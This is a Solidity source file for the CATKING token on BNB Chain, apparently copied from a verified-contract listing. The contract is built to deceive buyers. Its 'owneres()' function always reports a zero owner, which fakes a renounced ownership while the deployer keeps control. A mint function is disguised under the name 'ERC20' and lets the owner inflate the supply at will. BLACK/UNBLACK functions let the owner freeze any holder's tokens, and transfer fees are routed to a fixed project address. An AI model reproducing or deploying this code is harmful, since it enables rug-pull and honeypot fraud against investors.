/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owneres;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owneres);
        _;
    }

/**
    * @dev Returns the address of the current owneres.
     */
    function owneres() public pure returns (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owneres, newowneres);
        owneres = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owneres, address(0));
        owneres = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'CATKING';

    string constant public symbol = 'CATKING';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 1000000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFIE;

    mapping(address => bool) private _lck;


    uint256 public _taxFIE = 2;
    uint256 private _previousTaxFIE = _taxFIE;

    uint256 public _burnFIE = 10;
    uint256 private _previousBurnFIE = _burnFIE;


    address public projectAddress = 0xe804ACB3B0F389BA82F759507a6f09bF2bd4Ac94;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owneres, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lck[from], "is lck");

        if(_isExcludedFromFIE[from])
            removeAllFIE();

        uint256 FIE =  calculateTaxFIE(value);

        uint256 burn =  calculateBurnFIE(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(FIE).sub(burn);

        if(FIE > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(FIE);
            emit Transfer(from, projectAddress, FIE);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromFIE[from])
            restoreAllFIE();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function ERC20(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxFIE(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFIE).div(
            10 ** 2
        );
    }

    function calculateBurnFIE(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFIE).div(
            10 ** 2
        );
    }

    function removeAllFIE() private {
        if(_taxFIE == 0 && _burnFIE == 0)
            return;

        _previousTaxFIE = _taxFIE;
        _previousBurnFIE = _burnFIE;
        _taxFIE = 0;
        _burnFIE = 0;
    }

    function restoreAllFIE() private {
        _taxFIE = _previousTaxFIE;
        _burnFIE = _previousBurnFIE;
    }



    function BLACK(address account) public onlyowneres {
        _lck[account] = true;
    }


    function UNBLACK(address account) public onlyowneres {
        _lck[account] = false;
    }


    function islck(address account) public view returns (bool) {

        return _lck[account];
    }


}


contract CATKING is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owneres = msg.sender;


    }

    function() public payable {
       revert();
    }
}